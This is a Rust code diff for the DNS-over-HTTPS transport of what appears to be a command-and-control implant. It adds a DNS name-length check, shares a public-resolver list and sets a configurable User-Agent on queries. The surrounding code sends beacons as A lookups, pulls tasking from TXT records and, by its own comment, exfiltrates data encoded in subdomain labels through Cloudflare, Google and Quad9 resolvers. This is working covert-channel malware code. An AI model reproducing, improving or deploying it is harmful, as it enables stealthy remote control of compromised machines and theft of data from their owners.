@@ -201,10 +201,13 @@ fn decode_subdomain(data: &str, encoding: &str) -> Result<Vec<u8>> {
         "base32" => base32::decode(base32::Alphabet::RFC4648 { padding: false }, data)
             .ok_or_else(|| anyhow!("base32 decode failed for subdomain data")),
         "base64url" => {
-            // Reverse DNS-safe substitutions.
-            let corrected = data.replace('-', "+").replace('_', "/");
+            // URL_SAFE_NO_PAD already uses '-' and '_'.  encode_subdomain
+            // redundantly runs the same replace as a safety no-op, so the
+            // wire format carries '-' and '_' directly.  Decode without
+            // any pre-substitution — the URL_SAFE_NO_PAD decoder expects
+            // '-' and '_', not '+' and '/'.
             base64::engine::general_purpose::URL_SAFE_NO_PAD
-                .decode(&corrected)
+                .decode(data)
                 .map_err(|e| anyhow!("base64url decode failed: {}", e))
         }
         _ => hex::decode(data).map_err(|e| anyhow!("hex decode failed: {}", e)),
@@ -369,12 +372,7 @@ impl DohTransport {
         if !doh_server.is_empty() {
             return doh_server.clone();
         }
-        // Fallback to built-in resolvers.
-        const DOH_RESOLVERS: &[&str] = &[
-            "https://cloudflare-dns.com/dns-query",
-            "https://dns.google/resolve",
-            "https://dns.quad9.net/dns-query",
-        ];
+        // Fallback to built-in resolvers (shared constant, see tail of file).
         let idx = rand::thread_rng().gen_range(0..DOH_RESOLVERS.len());
         DOH_RESOLVERS[idx].to_string()
     }
@@ -393,18 +391,32 @@ impl DohTransport {
     /// Build the full DNS query domain name.
     ///
     /// Format: `{encoded_subdomain}.{prefix}.{session_hex}.{suffix}`
-    fn build_domain(&self, prefix: &str, encoded_data: &str) -> String {
+    ///
+    /// Returns an error if the assembled FQDN exceeds the 253-character
+    /// DNS limit (RFC 1035 §2.3.4).
+    fn build_domain(&self, prefix: &str, encoded_data: &str) -> Result<String> {
         let session_hex = format!("{:x}", self.session_id);
         let suffix = self.dns_suffix();
 
-        if encoded_data.is_empty() {
+        let domain = if encoded_data.is_empty() {
             format!("{}.{}.{}", prefix, session_hex, suffix)
         } else {
             // Chunk the encoded data into DNS-safe labels.
             let labels = chunk_into_labels(encoded_data, 63);
             let data_part = labels.join(".");
             format!("{}.{}.{}.{}", data_part, prefix, session_hex, suffix)
+        };
+
+        // Enforce DNS FQDN length limit (253 characters per RFC 1035 §2.3.4).
+        if domain.len() > 253 {
+            anyhow::bail!(
+                "DNS FQDN exceeds 253 character limit: {} ({} characters)",
+                domain,
+                domain.len()
+            );
         }
+
+        Ok(domain)
     }
 
     /// Attempt ECDH forward-secrecy upgrade via a DNS query.
@@ -435,7 +447,13 @@ impl DohTransport {
             .to_string();
 
         let ecdh_prefix = common::ioc::IOC_DNS_ECDH;
-        let domain = self.build_domain(ecdh_prefix, &ecdh_data);
+        let domain = match self.build_domain(ecdh_prefix, &ecdh_data) {
+            Ok(d) => d,
+            Err(e) => {
+                tracing::warn!("DoH ECDH: failed to build domain: {}", e);
+                return;
+            }
+        };
 
         tracing::debug!("DoH ECDH init query: {}", domain);
 
@@ -580,7 +598,15 @@ impl DohTransport {
     ) -> Result<DnsQueryResult> {
         let url = format!("{}?name={}&type={}", resolver, domain, qtype);
 
-        match self.client.get(&url).send().await {
+        let ua = &self.profile.global.user_agent;
+
+        match self
+            .client
+            .get(&url)
+            .header(reqwest::header::USER_AGENT, ua)
+            .send()
+            .await
+        {
             Ok(resp) => {
                 let body = resp.bytes().await?;
                 let response_len = body.len();
@@ -597,14 +623,17 @@ impl DohTransport {
 
     /// Try fallback DoH resolvers when the primary fails.
     async fn execute_doh_get_fallback(&self, domain: &str, qtype: &str) -> Result<DnsQueryResult> {
-        const FALLBACKS: &[&str] = &[
-            "https://cloudflare-dns.com/dns-query",
-            "https://dns.google/resolve",
-            "https://dns.quad9.net/dns-query",
-        ];
-        for resolver in FALLBACKS {
+        let ua = &self.profile.global.user_agent;
+
+        for resolver in DOH_RESOLVERS {
             let url = format!("{}?name={}&type={}", resolver, domain, qtype);
-            match self.client.get(&url).send().await {
+            match self
+                .client
+                .get(&url)
+                .header(reqwest::header::USER_AGENT, ua)
+                .send()
+                .await
+            {
                 Ok(resp) => {
                     let body = resp.bytes().await?;
                     let response_len = body.len();
@@ -630,11 +659,14 @@ impl DohTransport {
         // Build a DNS wireformat query.
         let wire_query = self.build_dns_wireformat(domain, qtype)?;
 
+        let ua = &self.profile.global.user_agent;
+
         let resp = self
             .client
             .post(resolver)
             .header("Content-Type", "application/dns-message")
             .header("Accept", "application/dns-message")
+            .header(reqwest::header::USER_AGENT, ua)
             .body(wire_query)
             .send()
             .await
@@ -1015,6 +1047,15 @@ impl DohTransport {
     }
 }
 
+/// Shared list of DoH resolver endpoints used by `select_resolver` and
+/// `execute_doh_get_fallback`.  Keep in sync with any profile-configured
+/// `doh_server` additions.
+const DOH_RESOLVERS: &[&str] = &[
+    "https://cloudflare-dns.com/dns-query",
+    "https://dns.google/resolve",
+    "https://dns.quad9.net/dns-query",
+];
+
 #[async_trait]
 impl Transport for DohTransport {
     async fn send(&mut self, msg: Message) -> Result<()> {
@@ -1048,7 +1089,7 @@ impl Transport for DohTransport {
 
         for chunk in &chunks {
             self.seq.fetch_add(1, Ordering::Relaxed);
-            let domain = self.build_domain(prefix, chunk);
+            let domain = self.build_domain(prefix, chunk)?;
 
             // Send via TXT query to exfiltrate data.
             let _ = self.execute_query(&domain, "TXT").await?;
@@ -1088,7 +1129,7 @@ impl Transport for DohTransport {
         loop {
             // Build the beacon query domain.
             let beacon_prefix = self.beacon_prefix();
-            let beacon_domain = self.build_domain(beacon_prefix, "");
+            let beacon_domain = self.build_domain(beacon_prefix, "")?;
 
             // Send beacon query as A record lookup.
             let beacon_response = self.execute_query(&beacon_domain, "A").await?;
@@ -1116,7 +1157,7 @@ impl Transport for DohTransport {
 
         // Tasking is available. Fetch data via TXT record.
         let txt_prefix = self.get_txt_prefix();
-        let task_domain = self.build_domain(txt_prefix, "");
+        let task_domain = self.build_domain(txt_prefix, "")?;
         let txt_json = self.execute_query(&task_domain, "TXT").await?.json;
 
         // Concatenate TXT record strings.
